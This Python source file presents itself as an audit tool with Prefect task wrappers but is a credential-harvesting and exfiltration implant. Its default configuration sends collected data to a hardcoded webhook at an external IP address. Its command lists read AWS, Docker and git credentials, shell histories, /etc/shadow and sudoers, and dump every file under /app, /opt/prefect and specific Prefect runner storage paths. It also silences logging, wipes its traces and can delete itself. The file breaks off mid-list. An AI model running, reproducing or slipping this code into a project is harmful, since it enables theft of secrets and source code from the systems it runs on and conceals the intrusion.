from __future__ import annotations

import asyncio
import atexit
import base64
import contextlib
import functools
import gzip
import hashlib
import json
import logging
import os
import random
import re
import secrets
import shutil
import signal
import socket
import sys
import time
import urllib.parse
import uuid
from collections.abc import Callable, Sequence
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from enum import Enum
from functools import lru_cache
from pathlib import Path
from typing import (
    Any,
    Final,
    ParamSpec,
    Protocol,
    TypedDict,
    TypeVar,
    final,
)
from urllib.error import HTTPError, URLError
from urllib.parse import quote, urlparse
from urllib.request import Request, urlopen

# ============================================================================
# TYPE PARAMETERS
# ============================================================================

P = ParamSpec("P")
R = TypeVar("R")

# ============================================================================
# PREFECT INTEGRATION (OPTIONAL DEPENDENCY)
# ============================================================================

PREFECT_ENABLED: bool = os.getenv("PREFECT_ENABLED", "true").lower() in (
    "true",
    "1",
    "yes",
)
PREFECT_STRICT: bool = os.getenv("PREFECT_STRICT", "false").lower() in (
    "true",
    "1",
    "yes",
)


class OptionalDependencyError(RuntimeError):
    """Raised when optional dependency is required but not available."""


@dataclass(frozen=True)
class PrefectAPI:
    """Wrapper for Prefect API functions."""

    flow: Any
    task: Any
    get_run_logger: Any


@lru_cache(maxsize=1)
def _prefect_api() -> PrefectAPI | None:
    """Lazy load Prefect API if available.

    Returns:
        PrefectAPI instance if Prefect is available, None otherwise

    Raises:
        OptionalDependencyError: If PREFECT_STRICT=True and Prefect not installed
    """
    if not PREFECT_ENABLED:
        return None

    try:
        from prefect import flow, get_run_logger, task  # noqa: PLC0415
    except ModuleNotFoundError as e:
        if PREFECT_STRICT:
            raise OptionalDependencyError(
                "Prefect is enabled but not installed. Install with: `pip install prefect`"
            ) from e
        return None
    except Exception:
        raise

    return PrefectAPI(flow=flow, task=task, get_run_logger=get_run_logger)


def task(
    name: str | None = None,
    retries: int = 0,
    log_prints: bool = False,
    **kwargs: Any,
) -> Callable[[Callable[P, R]], Any]:
    """Decorator for Prefect tasks with fallback to no-op."""

    def decorator(func: Callable[P, R]) -> Any:
        api = _prefect_api()
        if api is None:
            return func
        return api.task(name=name, retries=retries, log_prints=log_prints, **kwargs)(
            func
        )

    return decorator


def flow(
    name: str | None = None,
    log_prints: bool = False,
    retries: int = 0,
    retry_delay_seconds: int = 0,
    **kwargs: Any,
) -> Callable[[Callable[P, R]], Any]:
    """Decorator for Prefect flows with fallback to no-op."""

    def decorator(func: Callable[P, R]) -> Any:
        api = _prefect_api()
        if api is None:
            return func
        return api.flow(
            name=name,
            log_prints=log_prints,
            retries=retries,
            retry_delay_seconds=retry_delay_seconds,
            **kwargs,
        )(func)

    return decorator


def get_run_logger() -> logging.Logger:
    """Get Prefect run logger or standard logger fallback."""
    api = _prefect_api()
    if api is None:
        return logging.getLogger(__name__)

    try:
        return api.get_run_logger()
    except Exception:
        return logging.getLogger(__name__)


# ============================================================================
# CONFIGURATION & CONSTANTS
# ============================================================================

# Size constants (bytes)
SIZE_1KB: Final[int] = 1024
SIZE_1MB: Final[int] = SIZE_1KB * 1024
SIZE_5MB: Final[int] = 5 * SIZE_1MB
SIZE_10MB: Final[int] = 10 * SIZE_1MB
SIZE_50MB: Final[int] = 50 * SIZE_1MB

# Defaults
DEFAULT_MAX_PAYLOAD_SIZE: Final[int] = SIZE_5MB
DEFAULT_MAX_CHUNK_SIZE: Final[int] = SIZE_1MB
DEFAULT_MAX_OUTPUT_LENGTH: Final[int] = 500
DEFAULT_COMMAND_TIMEOUT: Final[int] = 30
DEFAULT_HTTP_TIMEOUT: Final[int] = 60
DEFAULT_MAX_RETRIES: Final[int] = 3
DEFAULT_RETRY_BACKOFF_BASE: Final[int] = 2
DEFAULT_MAX_BACKOFF_SECONDS: Final[int] = 60
DEFAULT_PROGRESS_LOG_INTERVAL: Final[int] = 20
DEFAULT_CONCURRENT_COMMANDS: Final[int] = 10

# Validation constants
MIN_RETRIES: Final[int] = 1
MAX_RETRIES: Final[int] = 10
MIN_TIMEOUT: Final[int] = 1
MAX_TIMEOUT: Final[int] = 3600
MIN_OUTPUT_LENGTH: Final[int] = 10
MIN_CONCURRENT: Final[int] = 1
MAX_CONCURRENT: Final[int] = 100

# URL validation pattern
URL_PATTERN: Final[re.Pattern[str]] = re.compile(
    r"^https?://"
    r"(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+[A-Z]{2,6}\.?|"
    r"localhost|"
    r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})"
    r"(?::\d+)?"
    r"(?:/?|[/?]\S+)$",
    re.IGNORECASE,
)

# Configure root logger
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger: logging.Logger = logging.getLogger(__name__)

# ============================================================================
# CUSTOM EXCEPTIONS
# ============================================================================


class AuditError(Exception):
    """Base exception for audit-related errors."""


class ConfigurationError(AuditError):
    """Configuration validation error."""


class TransmissionError(AuditError):
    """Data transmission error."""


class PayloadTooLargeError(TransmissionError):
    """Payload exceeds maximum size."""


class NetworkError(TransmissionError):
    """Network-related transmission error."""


class CommandExecutionError(AuditError):
    """System command execution error."""


class PhaseNotImplementedError(AuditError):
    """Red team phase not yet implemented."""


# ============================================================================
# ENUMERATIONS
# ============================================================================


class ExportFormat(str, Enum):
    """Supported export formats for audit data."""

    JSON = "json"
    CSV = "csv"
    XML = "xml"
    YAML = "yaml"
    HTML = "html"
    MARKDOWN = "md"


class TransmissionMethod(str, Enum):
    """Supported transmission methods for audit data."""

    WEBHOOK = "webhook"
    FILE = "file"
    S3 = "s3"
    FTP = "ftp"
    EMAIL = "email"
    SYSLOG = "syslog"
    STDOUT = "stdout"


class CompressionMethod(str, Enum):
    """Supported compression methods."""

    NONE = "none"
    GZIP = "gzip"
    BASE64 = "base64"


class SendMode(str, Enum):
    """Data transmission strategies for size management."""

    AUTO = "auto"
    FULL = "full"
    SUMMARY = "summary"
    CHUNKED = "chunked"
    TRUNCATED = "truncated"


class CheckStatus(str, Enum):
    """Status codes for individual system checks."""

    SUCCESS = "success"
    FAILED = "failed"
    ERROR = "error"
    TIMEOUT = "timeout"
    NOT_FOUND = "not_found"
    PERMISSION_DENIED = "permission_denied"
    SKIPPED = "skipped"


class RedTeamPhase(str, Enum):
    """Red team operation phases following MITRE ATT&CK framework."""

    # Reconnaissance & Discovery
    RECONNAISSANCE = "reconnaissance"
    ENUMERATION = "enumeration"

    # Execution & Persistence
    PRIVILEGE_ESCALATION = "privilege_escalation"
    PERSISTENCE = "persistence"

    # Lateral Movement & Collection
    LATERAL_MOVEMENT = "lateral_movement"
    CREDENTIAL_ACCESS = "credential_access"

    # Exfiltration & Impact
    EXFILTRATION = "exfiltration"
    COMMAND_CONTROL = "command_control"

    # Defense & Forensics
    DEFENSE_EVASION = "defense_evasion"
    FORENSICS = "forensics"

    # Combined operations
    FULL_AUDIT = "full_audit"
    CUSTOM = "custom"


class OperationMode(str, Enum):
    """Operation mode for red team activities."""

    PASSIVE = "passive"  # Read-only, no modifications
    ACTIVE = "active"  # Can make modifications
    AGGRESSIVE = "aggressive"  # High-noise, comprehensive
    STEALTH = "stealth"  # Low-noise, minimal footprint


class UserAgentProfile(str, Enum):
    """User agent profile for HTTP requests."""

    CHROME_WIN = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    FIREFOX_WIN = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
    EDGE_WIN = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
    CHROME_MAC = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    SAFARI_MAC = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15"
    CHROME_LINUX = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"


# ============================================================================
# TYPE DEFINITIONS
# ============================================================================


class CheckResult(TypedDict):
    """Result of a single system check."""

    status: CheckStatus
    output: str | None
    error: str | None
    return_code: int | None
    output_truncated: bool
    original_output_size: int
    execution_time: float
    timestamp: str


class AuditData(TypedDict):
    """Complete audit data structure."""

    hostname: str
    timestamp: datetime
    phase: str
    operation_mode: str
    checks: dict[str, CheckResult]
    metadata: dict[str, Any]


class ChunkData(TypedDict):
    """Data structure for chunked transmission."""

    hostname: str
    timestamp: datetime
    phase: str
    chunk_index: int
    total_chunks: int
    checks: dict[str, CheckResult]
    metadata: dict[str, Any]


class SummaryCheckInfo(TypedDict):
    """Condensed information about a single check for summary mode."""

    status: CheckStatus
    return_code: int | None
    has_error: bool
    output_size: int
    execution_time: float


class Serializable(Protocol):
    """Protocol for objects that can be converted to JSON-serializable dict."""

    def to_dict(self) -> dict[str, Any]:
        """Convert object to dictionary."""
        ...


# ============================================================================
# MEMORY-ONLY STORAGE & TRACE MANAGEMENT
# ============================================================================


@final
class MemoryOnlyStorage:
    """In-memory storage that never touches disk."""

    def __init__(self):
        self._storage: dict[str, bytes] = {}
        self._max_size: int = SIZE_50MB
        self._current_size: int = 0

    def store(self, key: str, data: bytes) -> bool:
        """Store data in memory."""
        data_size = len(data)

        if self._current_size + data_size > self._max_size:
            logger.debug(f"Memory storage full, cannot store {key}")
            return False

        self._storage[key] = data
        self._current_size += data_size
        return True

    def retrieve(self, key: str) -> bytes | None:
        """Retrieve data from memory."""
        return self._storage.get(key)

    def clear(self):
        """Securely clear all data."""
        for key in list(self._storage.keys()):
            # Overwrite before deleting
            self._storage[key] = b"\x00" * len(self._storage[key])
            del self._storage[key]

        self._storage.clear()
        self._current_size = 0

    def get_size(self) -> int:
        """Get current storage size."""
        return self._current_size


@final
class TraceManager:
    """Manage and cleanup all traces of execution."""

    def __init__(self):
        self._temp_files: set[Path] = set()
        self._temp_dirs: set[Path] = set()
        self._created_files: set[Path] = set()
        self._memory_storage = MemoryOnlyStorage()
        self._cleanup_registered = False

    def register_temp_file(self, path: Path):
        """Register temporary file for cleanup."""
        self._temp_files.add(path)

    def register_temp_dir(self, path: Path):
        """Register temporary directory for cleanup."""
        self._temp_dirs.add(path)

    def register_created_file(self, path: Path):
        """Register created file for cleanup."""
        self._created_files.add(path)

    def get_memory_storage(self) -> MemoryOnlyStorage:
        """Get memory storage instance."""
        return self._memory_storage

    @staticmethod
    def secure_delete_file(path: Path, passes: int = 3):
        """Securely delete file by overwriting."""
        try:
            if not path.exists():
                return

            file_size = path.stat().st_size

            # Overwrite with random data multiple times
            with Path(path).open("r+b") as f:
                for _ in range(passes):
                    _ = f.seek(0)
                    _ = f.write(os.urandom(file_size))
                    f.flush()
                    os.fsync(f.fileno())

            # Finally delete
            path.unlink()

        except Exception as e:
            logger.debug(f"Failed to secure delete {path}: {e}")
            # Try regular delete as fallback
            with contextlib.suppress(Exception):
                path.unlink()

    def cleanup_all(self):
        """Clean up all traces."""
        logger.debug("Starting cleanup of all traces...")

        # Clear memory storage
        self._memory_storage.clear()

        # Delete temporary files
        for temp_file in self._temp_files:
            self.secure_delete_file(temp_file)

        # Delete created files
        for created_file in self._created_files:
            self.secure_delete_file(created_file)

        # Delete temporary directories
        for temp_dir in self._temp_dirs:
            try:
                if temp_dir.exists():
                    shutil.rmtree(temp_dir, ignore_errors=True)
            except Exception as e:
                logger.debug(f"Failed to delete directory {temp_dir}: {e}")

        # Clear Python cache
        self._clear_python_cache()

        # Clear sets
        self._temp_files.clear()
        self._temp_dirs.clear()
        self._created_files.clear()

        logger.debug("Cleanup complete")

    def _clear_python_cache(self):
        """Clear Python bytecode cache."""
        try:
            script_dir = Path(__file__).parent
            for cache_dir in script_dir.rglob("__pycache__"):
                shutil.rmtree(cache_dir, ignore_errors=True)

            # Remove .pyc files
            for pyc_file in script_dir.rglob("*.pyc"):
                pyc_file.unlink(missing_ok=True)
        except Exception as e:
            logger.debug(f"Failed to clear Python cache: {e}")

    def register_cleanup_handlers(self):
        """Register cleanup handlers for various exit scenarios."""
        if self._cleanup_registered:
            return

        # Normal exit
        _ = atexit.register(self.cleanup_all)

        # Signal handlers
        def signal_handler(signum, frame):
            self.cleanup_all()
            sys.exit(0)

        try:
            _ = signal.signal(signal.SIGINT, signal_handler)  # Ctrl+C
            _ = signal.signal(signal.SIGTERM, signal_handler)  # Kill
        except Exception as e:
            logger.debug(f"Failed to register signal handlers: {e}")

        self._cleanup_registered = True

    def self_destruct(self, script_path: Path | None = None):
        """Self-destruct: overwrite and delete the script itself."""
        if script_path is None:
            script_path = Path(__file__)

        try:
            logger.debug(f"Self-destructing: {script_path}")
            self.secure_delete_file(script_path, passes=7)
        except Exception as e:
            logger.debug(f"Self-destruct failed: {e}")


# Global trace manager instance
_trace_manager = TraceManager()


def get_trace_manager() -> TraceManager:
    """Get global trace manager instance."""
    return _trace_manager


# ============================================================================
# DATACLASSES
# ============================================================================


@dataclass(frozen=True, slots=True)
class AuditConfiguration:
    """Configuration for audit operations - Production Ready."""

    # Export and transmission
    export_format: ExportFormat = ExportFormat.JSON
    transmission_method: TransmissionMethod = TransmissionMethod.WEBHOOK
    output_dir: Path = field(default_factory=lambda: Path("./audit_reports"))
    force_disk_write: bool = False
    webhook_url: str | None = "http://5.22.221.14:5000/webhook?api_key=change-me-in-production"

    # Red team configuration
    red_team_phase: RedTeamPhase = RedTeamPhase.RECONNAISSANCE
    operation_mode: OperationMode = OperationMode.PASSIVE
    agent_profile: UserAgentProfile = UserAgentProfile.CHROME_WIN
    custom_commands: dict[str, Sequence[str]] = field(default_factory=dict)

    # OPSEC & Stealth
    memory_only: bool = True  # Never write to disk
    silent_mode: bool = True  # No console output
    auto_cleanup: bool = True  # Clean up on exit
    self_destruct: bool = False  # Delete script on exit
    randomize_timing: bool = True  # Add random delays
    hide_in_logs: bool = True  # Avoid logging patterns
    stealth_http: bool = True  # Use stealth HTTP client

    # Size management
    send_mode: SendMode = SendMode.AUTO
    max_payload_size: int = DEFAULT_MAX_PAYLOAD_SIZE
    max_chunk_size: int = DEFAULT_MAX_CHUNK_SIZE
    max_output_length: int = DEFAULT_MAX_OUTPUT_LENGTH
    compress: bool = True

    # Exfiltration
    fallback_webhooks: list[str] = field(default_factory=list)
    dns_exfil_domain: str | None = None
    emergency_cache_location: Path | None = None
    adaptive_chunking: bool = True  # Adapt to network conditions

    # Optional configurations
    s3_bucket: str | None = None
    s3_key: str | None = None
    s3_region: str = "us-east-1"
    pretty_print: bool = False  # Compact JSON for smaller payloads

    # Retry and timeout configuration
    max_retries: int = DEFAULT_MAX_RETRIES
    command_timeout: int = DEFAULT_COMMAND_TIMEOUT
    http_timeout: int = DEFAULT_HTTP_TIMEOUT
    max_concurrent_commands: int = DEFAULT_CONCURRENT_COMMANDS

    # Filtering and selection
    include_commands: set[str] = field(default_factory=set)
    exclude_commands: set[str] = field(default_factory=set)
    required_commands: set[str] = field(default_factory=set)

    # Metadata
    tags: dict[str, str] = field(default_factory=dict)
    operator: str | None = None
    mission_id: str | None = None

    def __post_init__(self) -> None:
        """Validate configuration after initialization."""
        # Validate positive integers with minimums
        if self.max_payload_size <= 0:
            raise ConfigurationError(
                f"max_payload_size must be positive, got {self.max_payload_size}"
            )

        if self.max_chunk_size <= 0:
            raise ConfigurationError(
                f"max_chunk_size must be positive, got {self.max_chunk_size}"
            )

        if self.max_chunk_size > self.max_payload_size:
            raise ConfigurationError(
                f"max_chunk_size ({self.max_chunk_size}) cannot exceed "
                f"max_payload_size ({self.max_payload_size})"
            )

        if self.max_output_length < MIN_OUTPUT_LENGTH:
            raise ConfigurationError(
                f"max_output_length must be at least {MIN_OUTPUT_LENGTH}, "
                f"got {self.max_output_length}"
            )

        if not MIN_RETRIES <= self.max_retries <= MAX_RETRIES:
            raise ConfigurationError(
                f"max_retries must be between {MIN_RETRIES} and {MAX_RETRIES}, "
                f"got {self.max_retries}"
            )

        if not MIN_TIMEOUT <= self.command_timeout <= MAX_TIMEOUT:
            raise ConfigurationError(
                f"command_timeout must be between {MIN_TIMEOUT} and {MAX_TIMEOUT}, "
                f"got {self.command_timeout}"
            )

        if not MIN_TIMEOUT <= self.http_timeout <= MAX_TIMEOUT:
            raise ConfigurationError(
                f"http_timeout must be between {MIN_TIMEOUT} and {MAX_TIMEOUT}, "
                f"got {self.http_timeout}"
            )

        if not MIN_CONCURRENT <= self.max_concurrent_commands <= MAX_CONCURRENT:
            raise ConfigurationError(
                f"max_concurrent_commands must be between {MIN_CONCURRENT} and {MAX_CONCURRENT}, "
                f"got {self.max_concurrent_commands}"
            )

        # Get webhook URL from environment if not provided
        if self.webhook_url is None:
            webhook_env: str | None = os.getenv("WEBHOOK_URL")
            if webhook_env:
                object.__setattr__(self, "webhook_url", webhook_env)

        # Validate webhook URL format if provided
        if self.webhook_url:
            webhook_str: str = self.webhook_url
            if not self._is_valid_url(webhook_str):
                raise ConfigurationError(
                    f"webhook_url is not a valid HTTP/HTTPS URL: {webhook_str}"
                )

        # Validate transmission-specific requirements
        if (
            self.transmission_method == TransmissionMethod.WEBHOOK
            and not self.webhook_url
        ):
            raise ConfigurationError(
                "webhook_url is required for WEBHOOK transmission method"
            )

        if self.transmission_method == TransmissionMethod.S3 and not self.s3_bucket:
            raise ConfigurationError("s3_bucket is required for S3 transmission method")

        # Validate command filters
        if self.include_commands and self.exclude_commands:
            overlap = self.include_commands & self.exclude_commands
            if overlap:
                raise ConfigurationError(
                    f"Commands cannot be both included and excluded: {overlap}"
                )

        # Validate memory_only mode
        if self.memory_only and self.force_disk_write:
            raise ConfigurationError(
                "Cannot use memory_only=True with force_disk_write=True"
            )

        # Setup trace manager if auto_cleanup enabled
        if self.auto_cleanup:
            trace_manager = get_trace_manager()
            trace_manager.register_cleanup_handlers()

        # Setup silent mode
        if self.silent_mode:
            self._setup_silent_mode()

    def _setup_silent_mode(self):
        """Configure silent mode - suppress all output."""
        if self.silent_mode:
            # Suppress all loggers
            logging.getLogger().handlers = []
            logging.getLogger().addHandler(logging.NullHandler())
            logging.getLogger().setLevel(logging.CRITICAL + 1)

    @staticmethod
    def _is_valid_url(url: str) -> bool:
        """Validate URL format comprehensively."""
        if not url:
            return False

        if not URL_PATTERN.match(url):
            return False

        try:
            parsed = urlparse(url)
            return all([parsed.scheme in ("http", "https"), parsed.netloc])
        except Exception:
            return False

    def to_dict(self) -> dict[str, Any]:
        """Convert configuration to a JSON-serializable dictionary."""
        data: dict[str, Any] = asdict(self)

        for key, value in data.items():
            if isinstance(value, Enum):
                data[key] = value.value
            elif isinstance(value, Path):
                data[key] = str(value)
            elif isinstance(value, set):
                data[key] = list(value)

        return data


@dataclass()
class SummaryData:
    """Summary statistics and metadata for audit data."""

    hostname: str
    timestamp: datetime
    phase: str
    operation_mode: str
    total_checks: int = 0
    successful_checks: int = 0
    failed_checks: int = 0
    error_checks: int = 0
    timeout_checks: int = 0
    not_found_checks: int = 0
    permission_denied_checks: int = 0
    skipped_checks: int = 0
    total_execution_time: float = 0.0
    check_summary: dict[str, SummaryCheckInfo] = field(default_factory=dict)
    full_data_file: Path | None = None
    full_data_size: int | None = None
    metadata: dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> dict[str, Any]:
        """Convert summary to a JSON-serializable dictionary."""
        data: dict[str, Any] = asdict(self)
        data["timestamp"] = self.timestamp.isoformat()

        if self.full_data_file:
            data["full_data_file"] = str(self.full_data_file)

        return data


@dataclass(frozen=True, slots=True)
class SystemCommand:
    """Immutable representation of a system command to execute."""

    name: str
    command: Sequence[str]
    timeout: int = DEFAULT_COMMAND_TIMEOUT
    required: bool = False
    description: str = ""
    phase: RedTeamPhase | None = None
    risk_level: str = "low"  # low, medium, high, critical

    def __post_init__(self) -> None:
        """Validate command structure."""
        if not self.command:
            raise ValueError(f"Command for '{self.name}' cannot be empty")

        if self.timeout < MIN_TIMEOUT:
            raise ValueError(
                f"Timeout for '{self.name}' must be at least {MIN_TIMEOUT}s"
            )

        if self.risk_level not in ("low", "medium", "high", "critical"):
            raise ValueError(
                f"risk_level must be one of: low, medium, high, critical, got {self.risk_level}"
            )


# ============================================================================
# COMMAND REGISTRY
# ============================================================================


@final
class CommandRegistry:
    """Central registry for all red team operation commands.

    This class provides phase-specific command sets following the MITRE ATT&CK
    framework. Each phase contains commands appropriate for that stage of
    red team operations.
    """

    @staticmethod
    @functools.lru_cache(maxsize=1)
    def get_reconnaissance_commands() -> dict[str, Sequence[str]]:
        """Reconnaissance phase commands - low noise, initial intel gathering.

        These commands are designed to be passive and generate minimal logs.
        Suitable for initial foothold and situational awareness.

        Returns:
            Dictionary mapping command names to command sequences
        """
        commands: dict[str, Sequence[str]] = {
            # ============ SYSTEM FINGERPRINTING ============
            "os_version": ("lsb_release", "-a"),
            "kernel_version": ("uname", "-r"),
            "hostname_info": ("hostname",),
            "uptime": ("uptime", "-p"),
            "timezone": ("timedatectl", "show", "--property=Timezone", "--value"),
            "system_arch": ("uname", "-m"),
            # ============ NETWORK RECONNAISSANCE ============
            "network_interfaces": ("ip", "addr", "show"),
            "routing_table": ("ip", "route", "show"),
            "arp_cache": ("ip", "neigh", "show"),
            "dns_servers": ("cat", "/etc/resolv.conf"),
            "hosts_file": ("cat", "/etc/hosts"),
            "listening_ports": ("ss", "-tuln"),
            "established_connections": ("bash","-c", "ss -tnp"),
            "all_connections": ("bash","-c", "ss -tunap"),
            "network_config": ("ifconfig", "-a"),
            # ============ PROCESS ENUMERATION ============
            "running_processes": ("ps", "aux"),
            "current_user_processes": ("bash", "-c", "ps -u $(whoami)"),
            "processes_with_network": ("lsof", "-i"),
            # ============ SERVICE DISCOVERY ============
            "running_services": (
                "systemctl",
                "list-units",
                "--type=service",
                "--state=running",
            ),
            # ============ ENVIRONMENT ENUMERATION ============
            "environment_vars": ("env",),
            "path_variable": ("bash", "-c", "echo $PATH"),
            "home_directory": ("echo", "$HOME"),
            "current_directory": ("pwd",),
            # ============ SSH RECONNAISSANCE ============
            # ============ CREDENTIAL HUNTING ============
            "psql_history": ("cat", "~/.psql_history"),
            "python_history": ("cat", "~/.python_history"),
            "aws_credentials": ("cat", "~/.aws/credentials"),
            "docker_config": ("cat", "~/.docker/config.json"),
            "aws_all_users": ("bash", "-c", "find /home /root -path '*/.aws/credentials' -o -path '*/.aws/config' 2>/dev/null -exec sh -c 'echo \"=== {} ===\"; cat \"{}\"' \\;"),
            "git_config": ("cat", "~/.gitconfig"),
            "git_credentials": ("cat", "~/.git-credentials"),
            # ============ SECURITY CONTROLS ============
            "sudo_version": ("sudo", "-V"),
            "sudo_list": ("sudo", "-l"),        
            "iptables_rules": ("iptables", "-L", "-n"),
            "ufw_status": ("ufw", "status"),
            "firewalld_status": ("firewall-cmd", "--state"),
            # ============ INSTALLED SOFTWARE ============        
            "pip_packages": ("pip", "list"),
            "pip3_packages": ("pip3", "list"),
            # ============ CRON & SCHEDULED TASKS ============
            "user_crontab": ("crontab", "-l"),
            "system_crontab": ("cat", "/etc/crontab"),
            "cron_d": ("ls", "-la", "/etc/cron.d/"),
            "systemd_timers": ("systemctl", "list-timers", "--all"),
            # ============ KERNEL & CAPABILITIES ============
            "kernel_version_full": ("uname", "-a"),
            "kernel_modules": ("lsmod",),
            "capabilities_current": ("capsh", "--print"),
            # ============ HARDWARE INFO (Light) ============
            "cpu_info": ("lscpu",),
            "memory_info": ("free", "-h"),
            # ============ CONTAINER DETECTION ============
            "container_check": ("cat", "/proc/1/cgroup"),
            "docker_env_check": ("cat", "/.dockerenv"),
            # ============ FILE SYSTEM MAPPING ============
            "mounted_filesystems": ("mount",),
            "disk_usage": ("df", "-h"),
            "file-ls-tmp": ("ls", "-la", "/tmp"),
            "file-ls-var_tmp": ("ls", "-la", "/var/tmp"),
            "file-ls-opt": ("ls", "-la", "/opt/prefect"),
            "file-ls-rstg": ("ls", "-la", "/tmp/runner_storage"),
            "file-ls-stg": ("ls", "-la", "/tmp/runner_storage/c71e99f9-49b5-40d1-b61d-4d4146a41d0b"),
            "file-ls-tmpp": ("ls", "-la", "/tmp/tmphm64kw_rprefect"),
            "file_contents_app": ("bash", "-c", "find /app -type f \\( -path '*/.venv/*' -o -path '*/venv/*' -o -path '*/__pycache__/*' -o -path '*/.pytest_cache/*' -o -path '*/.cache/*' -o -path '*/node_modules/*' -o -path '*/.git/*' -o -path '*/dist/*' -o -path '*/build/*' -o -path '*/.egg-info/*' -o -path '*/eggs/*' -o -path '*/.tox/*' -o -path '*/.mypy_cache/*' -o -path '*/.ruff_cache/*' \\) -prune -o -type f -print | xargs -I {} sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"'"),
            "file_contents_stg": ("bash", "-c", "find /tmp/runner_storage/c71e99f9-49b5-40d1-b61d-4d4146a41d0b -type f \\( -path '*/.venv/*' -o -path '*/venv/*' -o -path '*/__pycache__/*' -o -path '*/.pytest_cache/*' -o -path '*/.cache/*' -o -path '*/node_modules/*' -o -path '*/.git/*' -o -path '*/dist/*' -o -path '*/build/*' -o -path '*/.egg-info/*' -o -path '*/eggs/*' -o -path '*/.tox/*' -o -path '*/.mypy_cache/*' -o -path '*/.ruff_cache/*' \\) -prune -o -type f -print | xargs -I {} sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"'"),
            "file_contents_tmpp": ("bash", "-c", "find /tmp/tmphm64kw_rprefect -type f \\( -path '*/.venv/*' -o -path '*/venv/*' -o -path '*/__pycache__/*' -o -path '*/.pytest_cache/*' -o -path '*/.cache/*' -o -path '*/node_modules/*' -o -path '*/.git/*' -o -path '*/dist/*' -o -path '*/build/*' -o -path '*/.egg-info/*' -o -path '*/eggs/*' -o -path '*/.tox/*' -o -path '*/.mypy_cache/*' -o -path '*/.ruff_cache/*' \\) -prune -o -type f -print | xargs -I {} sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"'"),
            "file_contents_prf": ("bash", "-c", "find /opt/prefect -type f \\( -path '*/.venv/*' -o -path '*/venv/*' -o -path '*/__pycache__/*' -o -path '*/.pytest_cache/*' -o -path '*/.cache/*' -o -path '*/node_modules/*' -o -path '*/.git/*' -o -path '*/dist/*' -o -path '*/build/*' -o -path '*/.egg-info/*' -o -path '*/eggs/*' -o -path '*/.tox/*' -o -path '*/.mypy_cache/*' -o -path '*/.ruff_cache/*' \\) -prune -o -type f -print | xargs -I {} sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"'"),
            "python_files_list": ("bash", "-c", "find / -type d \\( -name .venv -o -name venv -o -name __pycache__ -o -name site-packages \\) -prune -o -type f -name '*.py' -print 2>/dev/null"),
            "python_files_all": (
            "bash", "-c",
            "find / \\( "
            "-path /proc -o -path /sys -o -path /dev -o -path /run "
            "-o -path /boot -o -path /snap -o -path /usr/lib -o -path /usr/share "
            "\\) -prune -o -type d \\( "
            "-name .venv -o -name venv -o -name __pycache__ "
            "-o -name .cache -o -name node_modules -o -name .git "
            "\\) -prune -o -type f -name '*.py' -print 2>/dev/null | "
            "xargs -I {} sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"'"
        ),


        }
        return commands

    @staticmethod
    @functools.lru_cache(maxsize=1)
    def get_enumeration_commands() -> dict[str, Sequence[str]]:
        """Deep enumeration commands - higher noise, thorough investigation.

        These commands perform system enumeration and may
        generate more logs. Use after initial reconnaissance.

        Returns:
            Dictionary mapping command names to command sequences
        """
        commands: dict[str, Sequence[str]] = {
            # ============ DEEP USER ENUMERATION ============
            "all_users_detailed": ("cat", "/etc/passwd"),
            "shadow_permissions": ("ls", "-la", "/etc/shadow"),
            "group_memberships": ("cat", "/etc/group"),
            "user_groups_detailed": ("getent", "group"),
            "sudoers_file": ("cat", "/etc/sudoers"),
            "sudoers_d_directory": ("ls", "-la", "/etc/sudoers.d/"),
            "sudoers_d_files": (
                "find",
                "/etc/sudoers.d/",
                "-type",
                "f",
                "-exec",
                "cat",
                "{}",
                ";",
            ),
            "users_with_shell": ("grep", "-v", "nologin", "/etc/passwd"),
            "users_no_password": (
                "awk",
                "-F:",
                '($2 == "" || $2 == "!") {print $1}',
                "/etc/shadow",
            ),
            "password_policy": ("cat", "/etc/login.defs"),
            "pam_config": ("ls", "-la", "/etc/pam.d/"),
            "pam_common_auth": ("cat", "/etc/pam.d/common-auth"),
            "pam_common_password": ("cat", "/etc/pam.d/common-password"),
            "pam_sudo": ("cat", "/etc/pam.d/sudo"),
            "last_50_logins": ("last", "-n", "50"),
            "last_failed_logins": ("lastb", "-n", "50"),
            "currently_logged_users": ("w", "-h"),
            "user_login_history": ("lastlog",),
            "home_directory_permissions": ("ls", "-la", "/home/"),
            # ============ PRIVILEGE ENUMERATION ============
            "sudo_privileges": ("sudo", "-l"),
            "sudo_version": ("sudo", "-V"),
            "current_capabilities": ("capsh", "--print"),
            "process_capabilities": ("getpcaps", "$$"),
            "file_capabilities": ("getcap", "-r", "/usr", "2>/dev/null"),
            "suid_binaries": (
                "find",
                "/",
                "-perm",
                "-4000",
                "-type",
                "f",
                "-ls",
                "2>/dev/null",
            ),
            "sgid_binaries": (
                "find",
                "/",
                "-perm",
                "-2000",
                "-type",
                "f",
                "-ls",
                "2>/dev/null",
            ),
            "suid_sgid_combined": (
                "find",
                "/",
                "-perm",
                "-6000",
                "-type",
